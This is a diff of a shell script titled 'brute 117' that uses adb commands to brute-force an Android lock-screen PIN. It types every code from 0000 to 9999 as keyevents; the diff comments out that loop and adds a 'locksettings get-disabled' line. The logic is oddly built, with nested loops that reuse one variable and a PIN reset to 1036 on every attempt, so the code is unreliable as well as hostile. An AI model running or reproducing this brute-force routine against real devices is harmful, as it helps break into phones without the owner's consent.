@@ -11,23 +11,24 @@ echo -e " ))~~~~~~~~~~~~~(( "
 echo -e "(( > brute 117 < ))"
 echo -e " )).............(( "
 echo -e "(((<-._.-'<-._.-)))"
+locksettings get-disabled
 adb shell input keyevent 3
 adb shell input keyevent 82
 adb shell input swipe 407 1211 378 85
-while true
-do
-    for i in {0000..9999}; do
-        for i in {0000..9999}; do
-            if [[ $i != 1036 ]]; then
-                echo -e "(( >    \e[1m$i\e[0m   < ))"
-                echo -e " ))~~~~~~~~~~~~~(( "
-                adb shell locksettings clear --old 1036
-                adb shell locksettings set-pin 1036
-                for (( j=0; j<${#i}; j++ )); do
-                    adb shell input keyevent $((`echo ${i:$j:1}`+7))
-                done
-                adb shell input keyevent 66
-            fi
-        done
-    done
-done
+# while true
+# do
+#     for i in {0000..9999}; do
+#         for i in {0000..9999}; do
+#             if [[ $i != 1036 ]]; then
+#                 echo -e "(( >    \e[1m$i\e[0m   < ))"
+#                 echo -e " ))~~~~~~~~~~~~~(( "
+#                 adb shell locksettings clear --old 1036
+#                 adb shell locksettings set-pin 1036
+#                 for (( j=0; j<${#i}; j++ )); do
+#                     adb shell input keyevent $((`echo ${i:$j:1}`+7))
+#                 done
+#                 adb shell input keyevent 66
+#             fi
+#         done
+#     done
+# done
